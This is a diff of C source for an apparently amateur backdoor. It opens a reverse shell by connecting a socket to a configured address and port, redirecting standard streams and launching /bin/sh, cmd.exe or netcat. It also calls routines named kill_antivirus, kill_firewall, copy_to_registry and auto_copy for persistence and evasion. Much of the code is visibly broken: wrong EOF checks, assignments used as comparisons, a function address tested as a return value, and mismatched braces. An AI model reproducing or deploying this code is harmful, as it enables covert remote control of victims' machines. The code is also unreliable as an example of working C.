@@ -29,7 +29,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 #include <X11/Xlib.h>
 
 #define remote_addr "127.0.0.1"
-#define remote_port 55766
+#define remote_port 3389
 
 #define false 0
 #define true 1
@@ -73,7 +73,7 @@ void kill_antivirus()
     if(arq == 0)
         return;
     else
-       while( (arq=fgetc(arq)) != NULL)
+       while( (arq=fgetc(arq)) != 'EOF')
          if (arq = "\n")
 
    execve("TASKLIST /FI 'STATUS eq RUNNING'", 0, 0);
@@ -161,63 +161,72 @@ void copy_to_registry()
 
     /* setting up the connection */
 
-    s.sin_family = AF_INET;
-    s.sin_addr.s_addr = inet_addr(remote_addr);
-    s.sin_port = htons(remote_port);
+     s.sin_family = AF_INET;
+     s.sin_addr.s_addr = inet_addr(remote_addr);
+     s.sin_port = htons(remote_port);
 
-    memset(s.sin_zero, '\0', sizeof s.sin_zero);
+     memset(s.sin_zero, '\0', sizeof s.sin_zero);
 
-    x = socket(AF_INET, SOCK_STREAM, 0);
+     x = socket(AF_INET, SOCK_STREAM, 0);
 
-    usleep(60); /* if connection are slow... sleep for 30x2 sec untill made the connection */
+    /* sleep(120);  if connection are slow... sleep for 60x2 sec untill made the connection
+                   comment this if u think desnecessary...    */
 
-    (connect(x, (struct sockaddr *)&s, sizeof(s)));
+     (connect(x, (struct sockaddr *)&s, sizeof(s)));
      if (connect == -1)
      perror("socket(SOCKET_CONNECT)connect_failed");
 
-    if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
-    perror("setsockopt(SO_REUSEADDR)failed");
+     if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
+     perror("setsockopt(SO_REUSEADDR)failed");
 
-    send(x,"\nConnected\n",12,0),send(x,"\n#root > /n",7,0);
-    dup2(x, 0),dup2(x, 1),dup2(x, 2);
-    execve("/bin/sh", 0, 0),execve("C:\\windows\\System32\\cmd.exe ", 0, 0),execve("netcat", 0, 0);
+    // listen(x,10);
 
-    }
 
-    return;
+     /* don't freeze the memory, dude */
+     sleep(10);
+     /*enter in a shell, finally */
 
-    }
+     send(x,"\nsocket created\n",18,0), send(x,"\nConnected in machine\n",22,0),send(x,"\n#root > /n",7,0);
+     dup2(x, 0),dup2(x, 1),dup2(x, 2);
+     execve("/bin/sh", 0, 0),execve("C:\\windows\\System32\\cmd.exe ", 0, 0),execve("netcat", 0, 0);
+
+     }
+
+     return;
+
+     }
 
 /* execute the program */
 
-   int main(int argc, char **argv[])
-
-   {
-
-    /* shell run while the connection for true */
-
-    do {
-    shell();
-    }
-    while(connect == (true));
-
-   {
-	   
-    /* reserve this function for now */
-	   
-	   
-    auto_copy();
-    copy_to_registry();
-    kill_antivirus();
-    kill_firewall();
-    return;
+     int main(int argc, char **argv)
 
     {
 
-       }
+   /* guarante that this functions will run after the shell */
+
+      auto_copy();
+      copy_to_registry();
+      kill_antivirus();
+      kill_firewall();
+
+      usleep(30);
+
+    /* shell run while the connection for true */
+
+      do {
+      shell();
+      }
+      while (connect == (true));
+      if (connect == 0x0F)
+      return;
+
+
+      {
+
 
 
     }
+
 
 
 }
